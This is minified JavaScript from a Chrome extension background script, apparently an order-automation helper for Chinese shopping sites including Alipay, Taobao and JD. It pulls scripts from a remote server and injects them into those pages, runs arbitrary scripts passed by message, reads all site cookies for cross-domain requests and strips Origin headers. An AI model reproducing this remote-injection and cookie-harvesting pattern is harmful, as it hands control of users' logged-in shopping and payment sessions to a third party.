function(a,b){function d(a,b){var d,c=a.options;!c.type&&c.data&&(c.type="post"),d=c.url,d.indexOf("1688.com")>0&&(d="http://www.taobao.com"),c.crossDomain=!0,chrome.cookies.getAll({url:d},function(a){var f,d="";for(f=0;f<a.length;f++)"pdd_nickname"!=a[f].name&&(d+=a[f].name+"="+a[f].value+"; ");e(c,d,b)})}function e(a,b,c){a.complete=function(a){c({status:a.status,statusText:a.statusText,text:a.responseText,json:a.responseJSON})},$.ajax(a)}function f(a,b,d){d(c[a.key])}function g(a,b,d){"CurrentOrder"==a.key&&null!=a.value&&(a.value.tabId||(a.value.tabId=b.tab.id)),c[a.key]=a.value,null!=d&&d()}function h(a,c,d){var e=b[a.key];e&&""!=e&&"{"==e.substr(0,1)?d(JSON.parse(e)):d(e)}function i(a,b,c){var d=decodeURIComponent(a.inputScript);chrome.tabs.executeScript(b.tab.id,{code:d,allFrames:!0}),c({})}function j(a,b,c){chrome.tabs.executeScript(b.tab.id,{file:"base/jquery-1.12.4.min.js",allFrames:!0},function(){}),$.ajax({url:chrome.extension.getURL(a.file),complete:function(c){200==c.status?chrome.tabs.executeScript(b.tab.id,{file:a.file,allFrames:!0}):r(a.file,b.tab.id)}}),c({})}function k(a,b,c){var e,f,d={};if(chrome.cookies||(chrome.cookies=chrome.extension.cookies),d=a,d.hasSendBack=!1,e=0,null!=d.name&&d.name.length>0)for(f=0;f<d.name.length;f++)chrome.cookies.get({url:d.cUrl,name:d.name[f]},function(a){e++,null==a||null==a.value?1!=d.hasSendBack&&(d.hasSendBack=!0,c(d)):(d[a.name]=a.value,e>=d.name.length&&1!=d.hasSendBack&&c(d))});else chrome.cookies.getAll({url:d.cUrl},function(a){c(a)})}function l(a,b,c){null==a.tabId||"this"==a.tabId?chrome.tabs.remove(b.tab.id,c):chrome.tabs.remove(Number(a.tabId),c)}function p(a){for(var b=0;b<o.length;b++)if(o[b].url==a)return o[b];return null}function q(a,b,c){var e,d=(new Date).getTime();for(e=o.length-1;e>=0;e--)o[e].url==a?o.splice(e,1):o[e].etag||d-o[e].time>6e5&&o.splice(e,1);o.push({url:a,time:(new Date).getTime(),src:b,etag:c})}function r(a,c){var f,g,d=a,e=d.indexOf("?");return-1!=e&&(d=d.substring(0,e)),f=p(d),g=null==f?0:((new Date).getTime()-f.time)/1e3,null!=f&&300>=g?(s(f.src,c,d),void 0):($.ajax({method:"post",url:b["ServiceHost"]+"/User/Service/GetJsFiles",data:{url:a.indexOf("#")>0?a:d},headers:{"If-None-Match":null!=f?f.etag:""},complete:function(a){var b=a.responseJSON;return b?(s(b,c,d),q(d,b,a.getResponseHeader("ETag")),void 0):(null!=f&&(s(f.src,c,d),f.time=(new Date).getTime()),void 0)}}),void 0)}function s(a,b,c){var d,e;if(1!=n[c]){n[c]=!0;try{for(d=0;d<a.jsFile.length;d++)e=decodeURIComponent(a.jsFile[d]),chrome.tabs.executeScript(b,{code:e,allFrames:!0},function(){});for(d=0;d<a.cssFile.length;d++)e=decodeURIComponent(a.cssFile[d]),chrome.tabs.insertCSS(b,{code:e,allFrames:!0},function(){})}catch(f){console.log(f)}n[c]=!1}}function t(a,b,d){var e=c["CurrentOrder"];a.orderid=e.id,chrome.tabs.sendRequest(e.tabId,a,d)}function v(){var a=!1;d({type:"ajax2",options:{url:"http://www.jisuxiadan.com/js/speedtest?s71="+Math.random()}},function(c){a||200!=c.status||(a=!0,b["ServiceHost"]="http://www.jisuxiadan.com",w())}),d({type:"ajax2",options:{url:"http://s17.jisuxiadan.com/js/speedtest?s71="+Math.random()}},function(c){a||200!=c.status||(a=!0,b["ServiceHost"]="http://s17.jisuxiadan.com",w())})}function w(){d({type:"ajax2",options:{url:b["ServiceHost"]+"/User/Service/Permission"}},function(a){200==a.status&&a.json&&(m=a.json)})}var m,n,o,c={};b["ServiceHost"]="http://www.jisuxiadan.com",v(),setInterval(function(){v()},9e5),chrome.extension.onRequest.addListener(function(a,b,c){if("getBackgroundValue"==a.type)return f(a,b,c),void 0;if("setBackgroundValue"==a.type)return g(a,b,c),void 0;if("executeScript"==a.type)return i(a,b,c),void 0;if("executeFileScript"==a.type)return j(a,b,c),void 0;if("getCookies"==a.type)return k(a,b,c),void 0;if("closeTab"==a.type)return l(a,b,c),void 0;if("getThisTab"==a.type)return c(b),void 0;if("setOrder"==a.type)t(a,b,c);else if("ajax"==a.type||"ajax2"==a.type)d(a,c);else{if("getStorage"==a.type)return h(a,b,c),void 0;c()}}),m=["*://*.taobao.com/*","*://*.1688.com/*","*://*.tmall.com/*","*://*.alipay.com/*","*://*.xiaodian.com/*","*://*.mogujie.com/*","*://*.mogu.com/*","*://*.jd.com/*","*://*.yangkeduo.com/*","*://*.pinduoduo.com/*","*://*.jisuxiadan.com/*","*://*.591yp.com/*","*://*.suning.com/*","*://*.taojiji.com/*","*://*.jinritemai.com/*","*://*.mengtuiapp.com/*","*://*.mockuai.com/*","*://*.weidian.com/*","*://*.yimai123.com/*"],chrome.tabs.onUpdated.addListener(function(a,b,c){var d,e,f,g;if(-1!=c.url.indexOf("http")&&"loading"==b.status&&(d=!1,$.each(m,function(a,b){if(-1!=b.indexOf("*")){var e=new RegExp(b.replace("*://*.","").replace("*",""));return e.test(c.url)||c.url.indexOf("localhost")>0?(d=!0,!1):void 0}}),0!=d&&(e=c.id,"loading"==c.status))){if(c.load=1,f=c.url,0!=f.indexOf("http"))return;g=f.indexOf("?"),-1!=g&&(f=f.substring(0,g));try{chrome.tabs.insertCSS(e,{file:"base/style.css",allFrames:!0},function(){}),chrome.tabs.executeScript(e,{file:"base/jquery-1.12.4.min.js",allFrames:!0},function(){}),chrome.tabs.executeScript(e,{file:"base/jquery.tooltip.js",allFrames:!0},function(){}),chrome.tabs.executeScript(e,{file:"base/base.js",allFrames:!0},function(){}),chrome.tabs.executeScript(e,{file:"base/md5.js",allFrames:!0},function(){}),chrome.tabs.executeScript(e,{file:"base/base64.js",allFrames:!0},function(){})}catch(h){return}r(c.url,c.id)}}),n={},o=[{url:"",time:(new Date).getTime(),src:{}}],chrome.webRequest.onBeforeRequest.addListener(function(a){"POST"==a.method&&a.requestBody&&a.requestBody.raw&&a.requestBody.raw.length>0},{urls:["*://mms.pinduoduo.com/*"]},["blocking","requestBody"]),chrome.webRequest.onBeforeSendHeaders.addListener(function(a){var b,c,d;for(b=a.requestHeaders.length-1;b>=0;b--)c=a.requestHeaders[b].name,d=a.requestHeaders[b].value,"Origin"==c&&0!=d.indexOf("http")&&a.requestHeaders.splice(b,1);return{requestHeaders:a.requestHeaders}},{urls:["*://*.taobao.com/*","*://*.tmall.com/*","*://*.1688.com/*","*://*.pinduoduo.com/*","*://*.jd.com/*","*://*.kwaishop.com/*","*://*.jisuxiadan.com/*","*://*.kwaixiaodian.com/*"],types:["xmlhttprequest"]},["requestHeaders","blocking"]),a.speedTest=v}(window,localStorage);